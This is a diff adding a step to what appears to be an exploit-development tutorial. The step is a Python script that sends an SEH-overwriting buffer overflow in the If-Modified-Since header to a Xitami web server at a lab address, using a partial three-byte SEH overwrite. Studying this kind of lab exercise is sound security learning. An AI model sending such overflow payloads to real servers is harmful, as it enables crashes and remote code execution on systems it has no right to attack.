@@ -219,7 +219,39 @@ Time to find a `POP POP RET`. `!mona seh` nets us a small list of gadget address
 
 ![](/assets/images/CTP/xitamiSEH.JPG)
 
-The workaround here is that we need to overwrite only the first 3 bytes of 
+The workaround here is that we need to overwrite only the first 3 bytes of the current SEH address and let the program fill in the nullbyte for us. To test this, let's send this payload with a 3 byte value for `seh`:
+```python
+import socket
+import sys
+
+host = "192.168.1.201"
+port = 80
+
+seh = "\x84\xf5\x44"
+nseh = "CCCC"
+
+#PO @ 304
+crash = "A" * 304
+crash += nseh
+crash += seh
+crash += "D" * (1000 -len(crash))
+
+
+req = "GET / HTTP/1.1\r\n"
+req += "Host: 192.168.1.201\r\n"
+req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
+req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+req += "Accept-Language: en-US,en;q=0.5\r\n"
+req += "Accept-Encoding: gzip, deflate\r\n"
+req += "Connection: close\r\n"
+req += "Upgrade-Insecure-Requests: 1\r\n"
+req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.send(req)
+s.close()
+```
 
 
 ## Resources
